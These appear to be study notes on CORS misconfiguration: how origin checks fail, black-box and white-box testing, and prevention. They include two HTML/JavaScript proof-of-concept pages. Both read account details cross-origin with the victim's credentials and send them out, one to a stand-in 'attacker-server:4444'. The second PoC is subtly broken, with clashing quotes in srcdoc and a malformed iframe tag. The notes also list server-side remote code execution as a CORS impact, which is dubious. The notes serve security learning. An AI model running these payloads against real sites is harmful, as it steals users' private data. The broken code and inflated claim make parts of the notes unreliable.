## What is CORS (cross-origin resource sharing)?

   - CORS, or Cross-Origin Resource Sharing, is a way for web browsers to allow or restrict websites to access resources (like images or data) from different domains. It helps ensure security on the internet by controlling which websites can interact with each other.
   - In short line, Cross-origin Resource sharing(CORS) is a mechanism that uses HTTP headers to define origin that the browser permit loading resources.
![[cors5.png]]

#### Example - 
![[cors6.png]]

## CORS Vulnerabilities
![[cors9.png]]

   - CORS vulnerabilities arise from flows in the way that dynamic generation is implemented:
	   - Server-generated Access-Control-Allow-Origin header from client-specified Origin header.
	   - Error parsing Origin headers.
		   - Granting access to all domains that end in a specific string.
			   - Example: bank.com
			   - Bypass: maliciousbank.com
		   - Granting access to all domains that begin with a specific string
			   - Example: bank.com
			   - Bypass: bank.com.malicious.com
	   - Whitelisted null origin value.

## Impact of CORS Vulnerabilities

   - Depends on the application that is being exploited.
	   - Confidentiality - It can be None/Partial(Low)/High
	   - Integrity - Usually either Partial or High.
	   - Availability - Can be None/Partial(Low)/High
  - Remote code execution on the server. 

## Finding CORS vulnerabilities

### Black-Box Testing
   - Map the application.
   - Test the application for dynamic generation.
	   - Does it reflect the user-supplied ACAO header?
	   - Does it only validate on the start/end of a specific string?
	   - Does it allow the null origin?
	   - Does it restrict the protocol?
	   - Does it allow credentials?
Once you have determined that a CORS vulnerability exists, review the application's functionality to determine how you can prove the impact.

### White-Box Testing
   - Identify the framework/technologies that is being used by the application.
   - Find out how this specific technology allows for CORS configuration.
   - Review code to identify any misconfigurations in CORS rules.

## Exploiting CORS vulnerabilities

   - If the application allows for credentials:
	   - Server generated user supplied origin.
	   - Validates on the start/end of a specific string.

### CORS PoC
```jsx
<html>
	<body>
		<h1>Hello World!</h1>
		<script>
		var xhr = new XMLHttpRequest();
		var url = "https://vulnerable-site.com"
		xhr.onreadystatechange = function(){
			if(xhr.readyState == XMLHttpRequest.DONE){
				fetch("/log?key=" + xhr.responseText)
			}
		}
		xhr.open('GET', url + "/accountDetails", true);
		xhr.withCredentials = true;
		xhr.send(null);
		</script>
	</body>
</html>
```

Below one accepts the null origin.
### CORS PoC when header ACAO is null
```jsx
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
		<script>
		var xhr = new XMLHttpRequest();
		var url = "https://vulnerable-site.com"
		xhr.onreadystatechange = function(){
			if(xhr.readyState == XMLHttpRequest.DONE){
				fetch("http://attacker-server:4444/log?key=" + xhr.responseText)
			}
		}
		xhr.open('GET', url + "/accountDetails", true);
		xhr.withCredentials = true;
		xhr.send(null);
		</script>"></iframe
	</body>
</html>
```
Above we use sandbox is just make our script appear as if coming from the null origin.

Now, if the application does not allow for credentials
	- What security impact does that have on the application?
![[cors10.png]]

## Preventing CORS vulnerabilities

   - Proper configuration of cross-origin requests.
   - Only allow trusted  sites.
   - Avoid whitelisting null.
   - Avoid wildcards in internal networks.